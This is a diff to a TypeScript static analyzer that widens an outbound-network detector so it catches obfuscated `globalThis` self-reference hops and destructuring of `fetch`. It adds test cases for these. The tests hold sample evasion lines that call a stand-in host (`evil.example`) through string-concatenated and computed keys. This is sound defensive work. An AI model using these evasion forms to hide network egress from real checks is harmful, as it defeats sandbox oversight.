@@ -1196,9 +1196,13 @@ const isFreeGlobalReceiver = (expr: ts.Expression, checker: ts.TypeChecker, sour
   // name is a global-receiver name and its own receiver is (recursively) a free global. Binder/
   // shadowing authority stays at the BASE identifier above — a shadowed base
   // (`function f(globalThis){ globalThis.globalThis.fetch() }`) demotes the whole chain to an
-  // ordinary object. Finite: recursion descends `recv.expression`.
+  // ordinary object. DDR-NET-STATIC-KEY-PARITY (F1): the ELEMENT-access hop key is folded by the
+  // bounded binder resolver (`netHopName`), so `globalThis['global' + 'This']`,
+  // `const k = 'globalThis'; globalThis[k]`, and `` globalThis[`glob` + 'alThis'] `` are recognized
+  // hops, while a genuinely runtime key resolves to null and is NOT a hop. Finite: recursion
+  // descends `recv.expression`.
   if (ts.isPropertyAccessExpression(recv) || ts.isElementAccessExpression(recv)) {
-    const hop = selfReferenceHopName(recv);
+    const hop = ts.isPropertyAccessExpression(recv) ? recv.name.text : netHopName(recv.argumentExpression, checker);
     return hop !== null && GLOBAL_RECEIVER_NAMES.has(hop) && isFreeGlobalReceiver(recv.expression, checker, sourceFile);
   }
   return false;
@@ -1563,20 +1567,26 @@ const netResolveKey = (
   memo: Map<ts.Declaration, NetKey>,
   budget: { spent: number },
   depth: number,
+  // The longest name any consumer of THIS resolution compares against: `MAX_NETWORK_MEMBER_LENGTH`
+  // for a network member key, `MAX_GLOBAL_RECEIVER_LENGTH` for a self-reference hop key (a hop can
+  // fold to `globalThis`, 10 > the 9-char network ceiling, so the ceiling must travel with the
+  // call). `memo` is keyed by declaration AND is caller-scoped to a single `maxLen`, so a
+  // NotCapability decided under one ceiling can never be read back under the other.
+  maxLen: number,
 ): NetKey => {
   if (depth > NET_RESOLVE_DEPTH_CAP) throw new NetResolveAbort(); // resource bound: not memoized
   const n = unwrapExpr(node);
   if (ts.isStringLiteralLike(n)) return { kind: 'resolved', value: n.text };
   if (ts.isBinaryExpression(n) && n.operatorToken.kind === ts.SyntaxKind.PlusToken) {
-    const left = netResolveKey(n.left, checker, seen, memo, budget, depth + 1);
+    const left = netResolveKey(n.left, checker, seen, memo, budget, depth + 1, maxLen);
     if (left.kind === 'indeterminate') return NET_INDETERMINATE;
     if (left.kind === 'notCapability') return NET_NOT_CAPABILITY; // already too long; `+` only grows it
-    const right = netResolveKey(n.right, checker, seen, memo, budget, depth + 1);
+    const right = netResolveKey(n.right, checker, seen, memo, budget, depth + 1, maxLen);
     if (right.kind === 'indeterminate') return NET_INDETERMINATE;
     if (right.kind === 'notCapability') return NET_NOT_CAPABILITY;
     // Bound OUTPUT before allocating `left + right`: an oversized result is provably NotCapability,
     // so no exponential intermediate is ever materialized.
-    if (left.value.length + right.value.length > MAX_NETWORK_MEMBER_LENGTH) return NET_NOT_CAPABILITY;
+    if (left.value.length + right.value.length > maxLen) return NET_NOT_CAPABILITY;
     return { kind: 'resolved', value: left.value + right.value };
   }
   if (ts.isIdentifier(n)) {
@@ -1612,7 +1622,7 @@ const netResolveKey = (
         cur = init; // alias hop: iterate, no recursion
         continue;
       }
-      key = netResolveKey(init, checker, seen, memo, budget, depth + 1); // literal / `+`-fold
+      key = netResolveKey(init, checker, seen, memo, budget, depth + 1, maxLen); // literal / `+`-fold
       break;
     }
     // Reached only on a NON-abort return (a thrown NetResolveAbort unwinds past this, leaving the
@@ -1641,11 +1651,56 @@ const netMemberKey = (
 ): NetKey => {
   if (ts.isPropertyAccessExpression(node)) return { kind: 'resolved', value: node.name.text };
   try {
-    return netResolveKey(node.argumentExpression, checker, new Set<ts.Declaration>(), memo, { spent: 0 }, 0);
+    return netResolveKey(node.argumentExpression, checker, new Set<ts.Declaration>(), memo, { spent: 0 }, 0, MAX_NETWORK_MEMBER_LENGTH);
   } catch (error) {
     if (error instanceof NetResolveAbort) return NET_INDETERMINATE;
     throw error;
   }
+};
+
+// The longest global-receiver name (`globalThis` = 10). A self-reference hop key can fold to it,
+// so the hop resolver's `+`-fold ceiling must reach 10 — one above the 9-char network member
+// ceiling — or `globalThis['global' + 'This']` would be pruned as NotCapability before resolving.
+const MAX_GLOBAL_RECEIVER_LENGTH = Math.max(...[...GLOBAL_RECEIVER_NAMES].map((name) => name.length));
+
+// DDR-NET-STATIC-KEY-PARITY (F1) — the self-reference HOP name an element-access key denotes,
+// resolved by the SAME bounded binder resolver used for network member keys (`netResolveKey`),
+// never by identifier text: a string literal / substitution-free template, a `+`-fold, or a
+// binder-proven unique `const` chain, capped at `MAX_GLOBAL_RECEIVER_LENGTH`. Only a Resolved key
+// yields a hop name; NotCapability, Indeterminate, and a resource-bound abort all become null (NOT
+// a hop), so a genuinely runtime key (`globalThis[runtimeKey]`) is never folded into a self-hop and
+// stays outside the frozen boundary. A FRESH memo isolates the wider hop ceiling from the shared
+// network-member memo (a declaration classified under one ceiling is never read back under the
+// other). Binder/shadowing authority over the base identifier stays with `isFreeGlobalReceiver`.
+const netHopName = (node: ts.Expression, checker: ts.TypeChecker): string | null => {
+  try {
+    const key = netResolveKey(node, checker, new Set<ts.Declaration>(), new Map<ts.Declaration, NetKey>(), { spent: 0 }, 0, MAX_GLOBAL_RECEIVER_LENGTH);
+    return key.kind === 'resolved' ? key.value : null;
+  } catch (error) {
+    if (error instanceof NetResolveAbort) return null;
+    throw error;
+  }
+};
+
+// DDR-NET-STATIC-KEY-PARITY (F2) — classify a destructuring property KEY (declaration binding
+// element OR assignment ObjectLiteral property) with the SAME three-state discipline as a member
+// key: a plain identifier / string-literal name is its own text (Resolved); a computed key
+// (`{ ['fe' + 'tch']: f }`, `{ [k]: f }`) is resolved off the binder by `netResolveKey` at the
+// network-member ceiling into Resolved / NotCapability / Indeterminate. At a proven free-global
+// receiver the caller applies the frozen NET policy — Resolved(capability) and Indeterminate DENY,
+// Resolved(other) / NotCapability ALLOW — so an indeterminate destructuring key fails closed
+// exactly like an indeterminate member key. Any other name form (numeric/private) is Indeterminate.
+const netDestructuringKey = (keyNode: ts.Node, checker: ts.TypeChecker): NetKey => {
+  if (ts.isComputedPropertyName(keyNode)) {
+    try {
+      return netResolveKey(keyNode.expression, checker, new Set<ts.Declaration>(), new Map<ts.Declaration, NetKey>(), { spent: 0 }, 0, MAX_NETWORK_MEMBER_LENGTH);
+    } catch (error) {
+      if (error instanceof NetResolveAbort) return NET_INDETERMINATE;
+      throw error;
+    }
+  }
+  if (ts.isIdentifier(keyNode) || ts.isStringLiteralLike(keyNode)) return { kind: 'resolved', value: keyNode.text };
+  return NET_INDETERMINATE;
 };
 
 /**
@@ -1717,13 +1772,44 @@ const usesOutboundNetwork = (source: string): boolean => {
         found = true;
       }
     }
-    // (3) destructuring a network global off a FREE global receiver: `const { fetch } = globalThis`.
+    // (3) DECLARATION destructuring a network global off a FREE global receiver:
+    //     `const { fetch } = globalThis`, `const { fetch: f } = globalThis.globalThis`. The source
+    //     KEY (`propertyName ?? name`) is classified with the SAME resolver as a member key
+    //     (DDR-NET-STATIC-KEY-PARITY F2): a plain/quoted key is its own text, a computed static key
+    //     (`{ ['fe' + 'tch']: f }`, `{ [k]: f }`) folds off the binder. At the proven free-global
+    //     receiver Resolved(capability) and Indeterminate DENY (an indeterminate key fails closed,
+    //     just like a member key), Resolved(other)/NotCapability ALLOW. Capability is extracted here,
+    //     at the destructuring; `f` is not followed onward through value flow.
     if (ts.isBindingElement(node) && ts.isObjectBindingPattern(node.parent) && ts.isVariableDeclaration(node.parent.parent)) {
-      const key = node.propertyName ?? node.name;
-      const name = ts.isIdentifier(key) ? key.text : ts.isStringLiteralLike(key) ? key.text : null;
       const initializer = node.parent.parent.initializer;
-      if (name !== null && NETWORK_GLOBAL_NAMES.has(name) && initializer !== undefined && isFreeGlobalReceiver(initializer, checker, sourceFile)) {
-        found = true;
+      if (initializer !== undefined && isFreeGlobalReceiver(initializer, checker, sourceFile)) {
+        const key = netDestructuringKey(node.propertyName ?? node.name, checker);
+        if (key.kind === 'resolved') {
+          if (NETWORK_GLOBAL_NAMES.has(key.value)) found = true;
+        } else if (key.kind === 'indeterminate') {
+          found = true; // fail-closed at a proven free-global receiver
+        }
+      }
+    }
+    // (4) ASSIGNMENT destructuring a network global off a FREE global receiver:
+    //     `({ fetch: f } = globalThis)`, `({ fetch } = globalThis.globalThis)`. The target is an
+    //     ObjectLiteralExpression (Shorthand/PropertyAssignment), not a binding pattern, so branch
+    //     (3) does not see it (DDR-NET-STATIC-KEY-PARITY F2). Same classification and same
+    //     free-global fail-closed policy; bound to the `= globalThis` right-hand receiver, so an
+    //     unrelated `({ fetch: f } = obj)` and a shadowed-global receiver stay allowed.
+    if (ts.isBinaryExpression(node) && node.operatorToken.kind === ts.SyntaxKind.EqualsToken && isFreeGlobalReceiver(node.right, checker, sourceFile)) {
+      const target = binderUnwrap(node.left);
+      if (ts.isObjectLiteralExpression(target)) {
+        for (const prop of target.properties) {
+          const keyNode = ts.isShorthandPropertyAssignment(prop) ? prop.name : ts.isPropertyAssignment(prop) ? prop.name : undefined;
+          if (keyNode === undefined) continue;
+          const key = netDestructuringKey(keyNode, checker);
+          if (key.kind === 'resolved') {
+            if (NETWORK_GLOBAL_NAMES.has(key.value)) found = true;
+          } else if (key.kind === 'indeterminate') {
+            found = true; // fail-closed at a proven free-global receiver
+          }
+        }
       }
     }
     ts.forEachChild(node, visit);
@@ -5288,6 +5374,88 @@ describe('D3 host recognizes global-object self-reference chains as global recei
       expect(usesRuntimeCodeGeneration(source)).toBe(true);
     });
   }
+});
+
+// ---------------------------------------------------------------------------
+// DDR-NET-STATIC-KEY-PARITY — one bounded static-key abstraction across the NET free-global
+// surface. F1: a global-object SELF-REFERENCE hop whose element-access key is statically provable
+// (`globalThis['global' + 'This']`, `const k = 'globalThis'; globalThis[k]`,
+// `` globalThis[`glob` + 'alThis'] ``) denotes the real global, exactly like the already-recognized
+// dotted / string-literal hop, so a network member read off it is egress. F2: a network global
+// extracted by DESTRUCTURING ASSIGNMENT (`({ fetch: f } = globalThis)`) — an ObjectLiteral target,
+// not a binding pattern — is caught at the same free-global receiver as the declaration form, and a
+// computed static destructuring key folds while an indeterminate one fails closed. The hop key, the
+// member key, the declaration destructuring key, and the assignment destructuring key all resolve
+// through the SAME binder resolver (`netResolveKey`); binder/shadowing authority stays with the base
+// identifier, and a genuinely runtime key stays outside the frozen boundary. Capability is rejected
+// at extraction — `f` is not followed onward through value flow.
+// ---------------------------------------------------------------------------
+describe('D3 host folds static keys in self-reference hops and destructuring assignments (DDR-NET-STATIC-KEY-PARITY)', () => {
+  // ---- F1: self-reference hop static-key folding — DENY --------------------------------------
+  const f1Reject: readonly { readonly form: string; readonly source: string }[] = [
+    { form: '1. a dotted self-hop globalThis.globalThis.fetch', source: `globalThis.globalThis.fetch('https://evil.example/');` },
+    { form: "2. a literal-element self-hop globalThis['globalThis'].fetch", source: `globalThis['globalThis'].fetch('https://evil.example/');` },
+    { form: "3. a concatenated self-hop globalThis['global' + 'This'].fetch", source: `globalThis['global' + 'This'].fetch('https://evil.example/');` },
+    { form: '4. a const-key self-hop globalThis[k].fetch', source: `const k = 'globalThis';\nglobalThis[k].fetch('https://evil.example/');` },
+    { form: '5. a template/static self-hop globalThis[`glob` + `alThis`].fetch', source: 'globalThis[`glob` + `alThis`].fetch("https://evil.example/");' },
+    { form: "6. a mixed multi-hop globalThis['global' + 'This'].globalThis.fetch", source: `globalThis['global' + 'This'].globalThis.fetch('https://evil.example/');` },
+  ];
+  for (const { form, source } of f1Reject) {
+    it(`rejects ${form}`, () => {
+      expect(usesOutboundNetwork(source)).toBe(true);
+    });
+  }
+
+  // ---- F1: self-reference hop static-key folding — ALLOW (preserve) --------------------------
+  // 7. a genuinely runtime hop key resolves to null (NOT a hop), so the receiver is never folded
+  //    into a self-reference global. `globalThis[runtimeKey]` off a bare free global is denied by
+  //    the FROZEN indeterminate-member-key policy (unchanged); the hop-resolver contract is shown
+  //    here off a non-global receiver, where an unresolved key is correctly not treated as a hop.
+  const f1Allow: readonly { readonly form: string; readonly source: string }[] = [
+    { form: '7. a genuinely runtime hop key (not folded, receiver not a self-global)', source: `declare const holder: any;\ndeclare const runtimeKey: string;\nvoid holder[runtimeKey].fetch('https://evil.example/');` },
+    { form: '8. a shadowed globalThis base (binder says local)', source: `function f(globalThis: { globalThis: { fetch(x: string): void } }): void {\n  globalThis['global' + 'This'].fetch('https://evil.example/');\n}\nvoid f;` },
+    { form: "9. an unrelated object base unrelated['global' + 'This'].fetch", source: `const unrelated = { globalThis: { fetch: (x: string) => x } };\nvoid unrelated['global' + 'This'].fetch('x');` },
+    { form: "10. a folded NON-self-reference hop key globalThis['craf' + 'ty'].fetch", source: `globalThis['craf' + 'ty'].fetch('https://evil.example/');` },
+  ];
+  for (const { form, source } of f1Allow) {
+    it(`allows ${form}`, () => {
+      expect(usesOutboundNetwork(source)).toBe(false);
+    });
+  }
+
+  // ---- F2: destructuring (declaration + assignment) parity — DENY ----------------------------
+  const f2Reject: readonly { readonly form: string; readonly source: string }[] = [
+    { form: '11. a declaration shorthand const { fetch } = globalThis', source: `const { fetch } = globalThis;\nvoid fetch('https://evil.example/');` },
+    { form: '12. a declaration alias const { fetch: f } = globalThis', source: `const { fetch: f } = globalThis;\nvoid f('https://evil.example/');` },
+    { form: '13. an assignment alias ({ fetch: f } = globalThis)', source: `let f: (u: string) => unknown;\n({ fetch: f } = globalThis);\nvoid f;` },
+    { form: '14. an assignment shorthand through a self-hop ({ fetch } = globalThis.globalThis)', source: `let fetch: (u: string) => unknown;\n({ fetch } = globalThis.globalThis);\nvoid fetch;` },
+    { form: "15. a computed static assignment key ({ ['fe' + 'tch']: f } = globalThis)", source: `let f: (u: string) => unknown;\n({ ['fe' + 'tch']: f } = globalThis);\nvoid f;` },
+    { form: "16. a computed static declaration key const { ['fe' + 'tch']: f } = globalThis", source: `const { ['fe' + 'tch']: f } = globalThis;\nvoid f('https://evil.example/');` },
+    { form: '17. an indeterminate destructuring key on a proven free-global (fail-closed)', source: `declare const runtimeKey: string;\nconst { [runtimeKey]: f } = globalThis;\nvoid f;` },
+  ];
+  for (const { form, source } of f2Reject) {
+    it(`rejects ${form}`, () => {
+      expect(usesOutboundNetwork(source)).toBe(true);
+    });
+  }
+
+  // ---- F2: destructuring (declaration + assignment) parity — ALLOW (preserve) ----------------
+  const f2Allow: readonly { readonly form: string; readonly source: string }[] = [
+    { form: '18. an unrelated receiver assignment ({ fetch: f } = cfg)', source: `const cfg: { fetch?: (u: string) => unknown } = {};\nlet f: ((u: string) => unknown) | undefined;\n({ fetch: f } = cfg);\nvoid f;` },
+    { form: '19. a shadowed global receiver const { fetch } = globalThis (local param)', source: `function f(globalThis: { fetch: (u: string) => unknown }): void {\n  const { fetch } = globalThis;\n  void fetch('local');\n}\nvoid f;` },
+  ];
+  for (const { form, source } of f2Allow) {
+    it(`allows ${form}`, () => {
+      expect(usesOutboundNetwork(source)).toBe(false);
+    });
+  }
+
+  // Indeterminate fail-closed disposition is preserved for the ASSIGNMENT form too (F2 #17 twin).
+  it('rejects an indeterminate assignment key on a proven free-global fail-closed', () => {
+    expect(
+      usesOutboundNetwork(`declare const runtimeKey: string;\nlet f: unknown;\n({ [runtimeKey]: f } = globalThis);\nvoid f;`),
+    ).toBe(true);
+  });
 });
 
 // ---------------------------------------------------------------------------
